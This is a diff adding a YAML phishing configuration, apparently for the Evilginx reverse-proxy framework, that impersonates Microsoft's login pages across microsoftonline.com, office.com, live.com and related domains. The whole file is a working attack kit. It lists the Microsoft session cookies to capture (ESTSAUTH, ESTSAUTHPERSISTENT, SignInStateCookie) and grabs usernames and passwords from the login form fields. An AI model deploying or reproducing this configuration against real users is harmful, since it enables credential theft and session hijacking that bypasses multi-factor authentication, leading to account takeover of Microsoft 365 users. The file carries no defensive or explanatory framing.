@@ -1,0 +1,108 @@
+name: ‘microsoft’
+min_ver: "3.1.0"
+author: "@creepingmaaan"
+proxy_hosts:
+
+  - {
+      phish_sub: "login",
+      orig_sub: "login",
+      domain: "microsoftonline.com",
+      session: true,
+      is_landing: true,
+      auto_filter: true,
+    }
+
+  - {
+      phish_sub: "portal",
+      orig_sub: "portal",
+      domain: "microsoftonline.com",
+      session: true,
+      is_landing: false,
+      auto_filter: true,
+    }
+
+  - {
+      phish_sub: "account",
+      orig_sub: "account",
+      domain: "microsoftonline.com",
+      session: false,
+      is_landing: false,
+      auto_filter: true,
+    }
+
+  - {
+      phish_sub: "www",
+      orig_sub: "www",
+      domain: "office.com",
+      session: false,
+      is_landing: false,
+      auto_filter: true,
+    }
+
+  - {
+      phish_sub: "login",
+      orig_sub: "login",
+      domain: "microsoft.com",
+      session: false,
+      is_landing: false,
+      auto_filter: true,
+    }
+
+  - {
+      phish_sub: "aadcdn",
+      orig_sub: "aadcdn",
+      domain: "msftauth.net",
+      session: false,
+      is_landing: false,
+      auto_filter: true,
+    }
+
+  - {
+      phish_sub: "login",
+      orig_sub: "login",
+      domain: "live.com",
+      session: false,
+      is_landing: false,
+      auto_filter: true,
+    }
+
+
+  - {
+      phish_sub: "www",
+      orig_sub: "www",
+      domain: "microsoft365.com",
+      session: false,
+      is_landing: false,
+      auto_filter: true,
+    }
+
+
+  - {
+      phish_sub: "login",
+      orig_sub: "login",
+      domain: "live.com",
+      session: false,
+      is_landing: false,
+      auto_filter: true,
+    }
+
+
+auth_tokens:
+  - domain: ".login.microsoftonline.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"]
+    type: "cookie"
+
+credentials:
+  username:
+    key: "login"
+    search: "(.*)"
+    type: "post"
+
+  password:
+    key: "passwd"
+    search: "(.*)"
+    type: "post"
+
+login:
+  domain: "login.microsoftonline.com"
+  path: "/"
